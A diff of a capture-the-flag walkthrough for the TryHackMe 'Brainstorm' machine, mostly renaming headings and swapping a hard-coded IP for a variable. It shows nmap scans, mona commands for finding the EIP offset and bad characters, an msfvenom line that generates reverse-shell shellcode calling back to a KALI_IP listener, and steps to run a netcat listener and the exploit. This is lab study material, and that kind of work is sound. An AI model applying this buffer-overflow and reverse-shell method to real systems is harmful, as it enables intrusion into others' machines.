@@ -6,13 +6,16 @@
 
 Reverse engineer a chat program and write a script to exploit a Windows machine.
 
+## Preparation
+
+[Set up a small local lab](../prep/README.md).
+
 ## Scanning
 
 The THM Brainstorm machine is blocking `ping`, so add the `-Pn` flag.
 
-    sudo nmap -p- -T4 -Pn MACHINE_IP
+    sudo nmap -p- -T4 -Pn $MACHINE_IP
 
-    sudo nmap -p- -T4 -Pn 10.10.150.106
     Starting Nmap 7.93 ( https://nmap.org ) at 2022-12-12 19:55 UTC
     Nmap scan report for ip-10-10-150-106.eu-west-1.compute.internal (10.10.150.106)
     Host is up (0.00090s latency).
@@ -27,9 +30,8 @@ The THM Brainstorm machine is blocking `ping`, so add the `-Pn` flag.
 
 ## Enumeration
 
-    sudo nmap -p 21,3389,9999 -sV -sC -v -Pn -T4 MACHINE_IP
+    sudo nmap -p 21,3389,9999 -sV -sC -v -Pn -T4 $MACHINE_IP
 
-    sudo nmap -p 21,3389,9999 -sV -sC -v -Pn -T4 10.10.150.106
     Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times may be slower.
     Starting Nmap 7.93 ( https://nmap.org ) at 2022-12-12 20:02 UTC
     ...
@@ -184,19 +186,12 @@ Start a web server on the Kali VM in the directory with the files (to download t
 
     python3 -m http.server
 
-Set up a Windows VM (on the same network as the Kali VM). On the Windows VM, install 
-[Immunity Debugger](https://www.immunityinc.com/products/debugger/) (requires the 32bit MSI installer for Python 2.7.18) 
-and copy the [mona.py file](https://github.com/Jtw0/Immunity-Debugger-Scripts) into the PyCommands folder in the 
-Immunity install. Oh, and get the binary files from the Kali box.
+## Exploiting buffer overflow
 
-## Fuzzing
+### Fuzzing
 
-Start Immunity Debugger (with admin privileges and mona installed), attach it to the application, run it, and configure mona:
-
-    !mona config -set workingfolder c:\mona\%p
-
-In Immunity, go to `Options -> Preferences -> Events`, and un-tick everything under `Break on`. Now the program will 
-only break when crashing on an overflow.
+Get the binary files from the Kali box, and start Immunity Debugger (with admin privileges and mona installed), attach 
+it to the application, run it, and 
 
 Go fuzzing to find out which amount of bytes will cause the application to crash. Use template:
 
@@ -230,7 +225,7 @@ while True:
 
 When it reaches between 2100 and 2200 bytes, it crashes.
 
-## Creating a cyclic pattern
+### Creating a cyclic pattern
 
 Identifying which part of the buffer that is being sent is landing in the `EIP` register, to be able to control the 
 execution flow. Using the `msf-pattern_create` tool to create a string of 2400 bytes (just to be safe).
@@ -290,7 +285,7 @@ EIP `offset` seems to be `2012`.
 
 Updating the `exploit.py` script with the found values, and remove the current payload.
 
-## Find badchars
+### Find badchars
 
 Get mona to create a byte array:
 
@@ -308,7 +303,7 @@ Add the badchars to the script, run it and compare:
 
     !mona -f C:\Share\bytearray.bin -a 00DCEEA8
 
-## The .dll
+### The .dll
 
 The executable pulls from a `.dll`, and to check exactly where in memory an attack is possible:
 
@@ -360,13 +355,13 @@ finally:
 
 ```
 
-## Generate shellcode
+### Generate shellcode
 
 Using `msfvenom` to generate the shellcode:
 
     msfvenom -p windows/shell_reverse_tcp LHOST=KALI_IP LPORT=443 EXITFUNC=thread -f c -a x86 -b "\x00"
 
-## Final exploit script
+### Final exploit script
 
 ```python
 #!/usr/bin/python3
@@ -426,7 +421,7 @@ finally:
 
 ```
 
-## Testing the exploit script
+### Testing the exploit script
 
 Start a listener on port `443` using netcat, run the `chatserver.exe` on the Windows VM (as Administrator), and run 
 the exploit.
